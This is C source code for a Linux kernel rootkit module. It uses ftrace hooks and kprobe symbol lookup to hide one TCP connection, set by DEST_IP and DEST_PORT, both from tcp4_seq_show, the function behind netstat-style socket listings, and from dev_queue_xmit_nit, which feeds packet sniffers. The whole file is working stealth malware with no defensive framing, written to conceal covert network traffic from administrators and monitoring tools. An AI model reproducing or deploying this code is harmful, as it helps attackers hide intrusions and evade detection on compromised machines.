#include "hide_tcp_sock.h"

struct ftrace_hook {
  const char *name;
  void *function;
  void *original;

  struct ftrace_ops ops;
};

// Netstat and similar tools use this function to show TCP sockets.
typedef int (*tcp4_seq_show_t)(struct seq_file *seq, void *v);
static tcp4_seq_show_t tcp4_seq_show_address = NULL;

// Network Interface Tap - nit.
// This function taps the sniffers about outgoing packets.
typedef void (*dev_queue_xmit_nit_t)(struct sk_buff *skb,
                                     struct net_device *dev);
static dev_queue_xmit_nit_t dev_queue_xmit_nit_addr = NULL;

// Signal if the socket is hidden.
static int sock_hidden = 0;

static void *find_symbol_address(const char *name) {
  struct kprobe kp = {.symbol_name = name};
  void *addr;

  register_kprobe(&kp);
  addr = (void *)kp.addr;
  unregister_kprobe(&kp);

  if (!addr) {
    printk(KERN_ERR "Failed to get %s address\n", name);
    return NULL;
  }

  return addr;
}

static asmlinkage long tcp4_seq_show_hook(struct seq_file *seq, void *v) {
  if (v && v != SEQ_START_TOKEN) {
    struct inet_sock *inet = (struct inet_sock *)v;

    if (inet && inet->inet_dport == htons(DEST_PORT) &&
        inet->inet_daddr == htonl(DEST_IP_NUM)) {
      return 0; // Hide the socket
    }
  }

  return tcp4_seq_show_address(seq, v);
}

static asmlinkage void dev_queue_xmit_nit_hook(struct sk_buff *skb,
                                               struct net_device *dev) {
  if (skb->protocol == htons(ETH_P_IP)) {
    struct iphdr *iph = ip_hdr(skb);
    u32 daddr = ntohl(iph->daddr);

    if (iph->protocol == IPPROTO_TCP) {
      struct tcphdr *tcph = tcp_hdr(skb);
      u16 dest_port = ntohs(tcph->dest);

      if (dest_port == DEST_PORT && daddr == DEST_IP_NUM) {
        return; // Hide the packet
      }
    }
  }

  dev_queue_xmit_nit_addr(skb, dev);
}

static void notrace callback_hook(unsigned long ip, unsigned long parent_ip,
                                  struct ftrace_ops *ops,
                                  struct ftrace_regs *regs) {
  struct ftrace_hook *hook_ops = container_of(ops, struct ftrace_hook, ops);

  if (!within_module(parent_ip, THIS_MODULE))
    regs->regs.ip = (unsigned long)hook_ops->function;
}

static struct ftrace_hook port_hide = {
    .name = "tcp4_seq_show",
    .function = tcp4_seq_show_hook,
    .original = NULL,

    .ops =
        {
            .func = callback_hook,
            .flags = FTRACE_OPS_FL_SAVE_REGS | FTRACE_OPS_FL_RECURSION |
                     FTRACE_OPS_FL_IPMODIFY,
        },
};

static struct ftrace_hook packets_hide = {
    .name = "dev_queue_xmit_nit",
    .function = dev_queue_xmit_nit_hook,
    .original = NULL,

    .ops =
        {
            .func = callback_hook,
            .flags = FTRACE_OPS_FL_SAVE_REGS | FTRACE_OPS_FL_RECURSION |
                     FTRACE_OPS_FL_IPMODIFY,
        },
};

int register_tcp_sock_hook(void) {
  int ret = 0;

  if (sock_hidden)
    return 0;

  if (!port_hide.original && !packets_hide.original) {
    port_hide.original = find_symbol_address(port_hide.name);
    if (!port_hide.original) {
      printk(KERN_ERR "Failed to get tcp4_seq_show address\n");
      return -1;
    }

    packets_hide.original = find_symbol_address(packets_hide.name);
    if (!packets_hide.original) {
      printk(KERN_ERR "Failed to get dev_queue_xmit_nit address\n");
      return -1;
    }
  }

  // Now set the filter to enable tracing
  ret = ftrace_set_filter_ip(&port_hide.ops, (unsigned long)port_hide.original,
                             0, 0);
  if (ret) {
    printk(KERN_ERR "Failed to set filter for %s, ret: %d\n", port_hide.name,
           ret);
    return ret;
  }

  ret = ftrace_set_filter_ip(&packets_hide.ops,
                             (unsigned long)packets_hide.original, 0, 0);
  if (ret) {
    printk(KERN_ERR "Failed to set filter for %s, ret: %d\n", packets_hide.name,
           ret);
    ftrace_set_filter_ip(&port_hide.ops, (unsigned long)port_hide.original, 1,
                         0);
    return ret;
  }

  // Register the ftrace function first
  ret = register_ftrace_function(&port_hide.ops);
  if (ret) {
    printk(KERN_ERR "Failed to register ftrace function\n");
    ftrace_set_filter_ip(&port_hide.ops, (unsigned long)port_hide.original, 1,
                         0);
    ftrace_set_filter_ip(&packets_hide.ops,
                         (unsigned long)packets_hide.original, 1, 0);
    return ret;
  }

  ret = register_ftrace_function(&packets_hide.ops);
  if (ret) {
    printk(KERN_ERR "Failed to register ftrace function\n");
    unregister_ftrace_function(&port_hide.ops);
    ftrace_set_filter_ip(&port_hide.ops, (unsigned long)port_hide.original, 1,
                         0);
    ftrace_set_filter_ip(&packets_hide.ops,
                         (unsigned long)packets_hide.original, 1, 0);
    return ret;
  }

  tcp4_seq_show_address = (tcp4_seq_show_t)port_hide.original;
  dev_queue_xmit_nit_addr = (dev_queue_xmit_nit_t)packets_hide.original;
  sock_hidden = 1;
  return 0;
}

void unregister_tcp_sock_hook(void) {
  if (!port_hide.original || !packets_hide.original || !sock_hidden)
    return;

  // Unregister the ftrace hook to stop tracing
  unregister_ftrace_function(&port_hide.ops);
  unregister_ftrace_function(&packets_hide.ops);

  // Disable the filter to stop monitoring the function
  ftrace_set_filter_ip(&port_hide.ops, (unsigned long)port_hide.original, 1, 0);
  ftrace_set_filter_ip(&packets_hide.ops, (unsigned long)packets_hide.original,
                       1, 0);
  sock_hidden = 0;
}
